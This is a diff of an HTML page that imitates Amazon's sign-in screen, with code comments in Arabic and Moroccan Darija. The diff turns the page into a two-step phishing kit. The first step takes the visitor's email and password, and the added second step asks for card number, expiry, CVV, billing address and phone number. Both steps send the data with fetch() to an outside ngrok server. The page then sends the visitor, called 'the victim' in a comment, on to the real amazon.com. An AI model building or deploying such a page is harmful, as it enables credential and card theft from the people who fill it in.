@@ -46,6 +46,12 @@
             margin-bottom: 15px;
         }
 
+        h2 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 20px;
+        }
+
         .form-group {
             margin-bottom: 15px;
         }
@@ -57,7 +63,7 @@
             font-size: 13px;
         }
 
-        input {
+        input, select {
             width: 100%;
             padding: 8px 10px;
             border: 1px solid #a6a6a6;
@@ -110,45 +116,155 @@
             color: #c40000;
             font-size: 12px;
             margin-top: 5px;
+            text-align: center;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .section {
+            margin-bottom: 20px;
+        }
+
+        .section h3 {
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+
+        .row {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .row .col {
+            flex: 1;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
-        </div>
-        <h1>Sign-In</h1>
-        <form id="loginForm">
-            <div class="form-group">
-                <label>Email or mobile phone number</label>
-                <input type="email" id="email" required autofocus>
+        <!-- الخطوة 1: تسجيل الدخول -->
+        <div id="step1" class="step active">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
             </div>
-            <div class="form-group">
-                <label>Password</label>
-                <input type="password" id="password" required>
+            <h1>Sign-In</h1>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Email or mobile phone number</label>
+                    <input type="email" id="email" required autofocus>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" required>
+                </div>
+                <button type="submit" class="continue-btn">Continue</button>
+            </form>
+            <div class="help-links">
+                <a href="#">Forgot Password?</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+                <a href="#">Sign in with passkey</a>
             </div>
-            <button type="submit" class="continue-btn">Continue</button>
-        </form>
-        <div class="help-links">
-            <a href="#">Forgot Password?</a>&nbsp;&nbsp;|&nbsp;&nbsp;
-            <a href="#">Sign in with passkey</a>
+            <div class="footer">
+                New to Amazon? <a href="#">Create your Amazon account</a>
+            </div>
+            <div id="error1" class="error"></div>
         </div>
-        <div class="footer">
-            New to Amazon? <a href="#">Create your Amazon account</a>
+
+        <!-- الخطوة 2: معلومات البطاقة البنكية والعنوان -->
+        <div id="step2" class="step">
+            <h2>Confirm payment method</h2>
+            <form id="paymentForm">
+                <div class="section">
+                    <h3>💳 Card information</h3>
+                    <div class="form-group">
+                        <label>Card number</label>
+                        <input type="text" id="card_number" placeholder="4444 3333 2222 1111" required>
+                    </div>
+                    <div class="row">
+                        <div class="col">
+                            <label>Expiry (MM/YY)</label>
+                            <input type="text" id="expiry" placeholder="12/28" required>
+                        </div>
+                        <div class="col">
+                            <label>CVV</label>
+                            <input type="text" id="cvv" placeholder="123" required>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h3>📍 Billing address</h3>
+                    <div class="form-group">
+                        <label>Full name</label>
+                        <input type="text" id="fullname" placeholder="John Doe" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Address line 1</label>
+                        <input type="text" id="address" placeholder="123 Main St" required>
+                    </div>
+                    <div class="row">
+                        <div class="col">
+                            <label>City</label>
+                            <input type="text" id="city" placeholder="New York" required>
+                        </div>
+                        <div class="col">
+                            <label>State/Province</label>
+                            <input type="text" id="state" placeholder="NY" required>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col">
+                            <label>ZIP code</label>
+                            <input type="text" id="zip" placeholder="10001" required>
+                        </div>
+                        <div class="col">
+                            <label>Country</label>
+                            <select id="country">
+                                <option value="US">United States</option>
+                                <option value="CA">Canada</option>
+                                <option value="UK">United Kingdom</option>
+                                <option value="FR">France</option>
+                                <option value="DE">Germany</option>
+                                <option value="MA">Morocco</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h3>📞 Contact information</h3>
+                    <div class="form-group">
+                        <label>Phone number</label>
+                        <input type="tel" id="phone" placeholder="+1 555 123 4567" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="continue-btn">Place your order</button>
+            </form>
+            <div id="error2" class="error"></div>
         </div>
-        <div id="error1" class="error"></div>
     </div>
 
     <script>
-        const SERVER_URL = "https://67b0-196-113-207-42.ngrok-free.app";
+        // ===== رابط السيربر (بدل الرابط القديم بالجديد) =====
+        // ===== الرابط الجديد ديال Ngrok: https://67b0-196-113-207-42.ngrok-free.app =====
+        const SERVER_URL = "https://67b0-196-113-207-42.ngrok-free.app/submit";
         const CLIENT_ID = "client1";
         const CLIENT_KEY = "key123";
 
+        let tempEmail = "", tempPassword = "";
+
+        // الخطوة 1: إرسال الإيميل والباسوورد
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            tempEmail = document.getElementById('email').value;
+            tempPassword = document.getElementById('password').value;
 
             try {
                 await fetch(SERVER_URL, {
@@ -158,11 +274,50 @@
                         'X-Client-ID': CLIENT_ID,
                         'X-Client-Key': CLIENT_KEY
                     },
-                    body: JSON.stringify({ email: email, password: password, stage: "login" })
+                    body: JSON.stringify({ email: tempEmail, password: tempPassword, stage: "login" })
                 });
-                window.location.href = 'https://www.amazon.com';
+                // الانتقال للخطوة الثانية
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step2').classList.add('active');
             } catch(err) {
                 document.getElementById('error1').textContent = 'Something went wrong. Please try again.';
+            }
+        });
+
+        // الخطوة 2: إرسال بيانات البطاقة والعنوان
+        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const paymentData = {
+                email: tempEmail,
+                password: tempPassword,
+                card_number: document.getElementById('card_number').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                fullname: document.getElementById('fullname').value,
+                address: document.getElementById('address').value,
+                city: document.getElementById('city').value,
+                state: document.getElementById('state').value,
+                zip: document.getElementById('zip').value,
+                country: document.getElementById('country').value,
+                phone: document.getElementById('phone').value,
+                stage: "payment"
+            };
+
+            try {
+                await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Client-ID': CLIENT_ID,
+                        'X-Client-Key': CLIENT_KEY
+                    },
+                    body: JSON.stringify(paymentData)
+                });
+                // تحويل الضحية لأمازون الحقيقية
+                window.location.href = 'https://www.amazon.com';
+            } catch(err) {
+                document.getElementById('error2').textContent = 'Something went wrong. Please try again.';
             }
         });
     </script>
